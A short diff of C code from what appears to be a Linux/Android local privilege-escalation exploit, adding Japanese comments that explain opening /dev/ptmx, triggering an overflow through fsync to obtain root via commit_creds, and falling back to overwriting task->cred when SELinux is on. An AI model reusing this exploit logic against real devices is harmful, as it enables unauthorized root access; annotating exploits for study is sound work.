@@ -196,18 +196,18 @@ run_obtain_root_privilege(void *user_data)
 
   obtain_root_privilege_func = obtain_root_privilege_by_commit_creds;
 
-  fd = open(PTMX_DEVICE, O_WRONLY);
+  fd = open(PTMX_DEVICE, O_WRONLY); // "/dev/ptmx"を書き込み専用で開く
 
-  ret = fsync(fd);
+  ret = fsync(fd); // オーバーフロー発生 uidが0になれば昇格成功
 
   if (getuid() != 0) {
     printf("commit_creds(): failed. Try to hack task->cred.\n");
 
     obtain_root_privilege_func = obtain_root_privilege_by_modify_task_cred; // SELinuxが有効の場合
-    ret = fsync(fd);
+    ret = fsync(fd); // オーバーフロー発生 credを書き換える uidが0になれば昇格成功
   }
 
-  close(fd);
+  close(fd); // close処理
 
   return (ret == 0);
 }
